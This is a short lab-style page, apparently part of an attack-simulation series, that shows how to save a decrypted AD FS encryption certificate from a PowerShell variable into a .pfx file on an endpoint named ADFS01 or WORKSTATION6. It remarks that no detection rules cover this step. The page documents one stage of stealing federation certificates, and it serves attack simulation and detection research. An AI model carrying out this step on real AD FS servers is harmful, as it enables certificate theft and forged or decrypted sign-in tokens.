# Export Active Directory Federation Services (AD FS) Encryption Certificate as PFX File

After [decrypting the AD FS encryption certificate](decryptADFSEncryptionCertificate.md), you can export the cipher text to a .pfx file. Remember that this step is also performed outside of the organization. Therefore, there are not detection rules for it.

## Preconditions
* Endpoint: ADFS01 or WORKSTATION6
    * Even when this step would happen outside of the organization, we can use the same PowerShell session on one of the endpoints where we [decrypted the AD FS encryption certificate](decryptADFSEncryptionCertificate.md) and exported the `cipher text` to a variable.
    * [AD FS encryption certificate (cipher text)](decryptADFSEncryptionCertificate.md)
        * Use the output cipher text saved in the variable `$encryptionPfx` in the PowerShell commands below.

## Export AD FS Encryption Certificate

```PowerShell
$CertificatePath = 'C:\ProgramData\ADFSEncryptionCertificate.pfx'
$encryptionPfx | Set-Content $CertificatePath -Encoding Byte

Get-item $CertificatePath
```

## Output

The certificate in the following location: `C:\ProgramData\ADFSEncryptionCertificate.pfx`

## References
* [Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)](https://o365blog.com/post/adfs/)